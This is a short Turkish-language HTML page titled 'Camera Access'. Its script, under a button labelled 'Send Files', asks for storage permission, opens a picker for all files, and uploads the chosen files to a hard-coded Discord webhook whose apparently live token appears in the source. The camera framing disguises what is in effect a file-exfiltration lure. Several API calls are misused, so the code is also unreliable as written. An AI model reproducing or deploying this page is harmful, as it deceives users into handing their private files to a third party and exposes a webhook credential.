<!DOCTYPE html>
<html>
  <head>
    <title>Kamera Erişimi</title>
  </head>
  <body>
    <h1>Kamera Erişimi</h1>
    <button id="take-picture">Dosyaları Gönder</button>
    <div id="picture-container"></div>

    <script>
      const takePictureButton = document.getElementById('take-picture');
      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';

      takePictureButton.addEventListener('click', async () => {
        try {
          // Request storage access permission
          const permission = await navigator.permissions.query('storage');
          if (permission.state === 'prompt') {
            const result = await permission.request();
            if (result.state === 'granted') {
              // Get all files on the device
              const files = await window.showOpenFilePicker({
                multiple: true,
                types: [
                  {
                    description: 'All Files',
                    accept: {
                      '*/*': ['*'],
                    },
                  },
                ],
              });

              const formData = new FormData();

              // Add all files to the form data
              files.forEach(file => {
                formData.append('file', file);
              });

              formData.append('username', 'Kamera Erişimi');
              formData.append('content', 'Dosyalar Gönderildi!');

              // Send the files to the Discord webhook
              fetch(webhookUrl, {
                method: 'POST',
                body: formData,
              })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
            } else {
              console.error('Storage access permission denied.');
            }
          } else {
            console.error('Storage access permission already denied.');
          }
        } catch (error) {
          console.error('Error:', error);
        }
      });
    </script>
  </body>
</html>
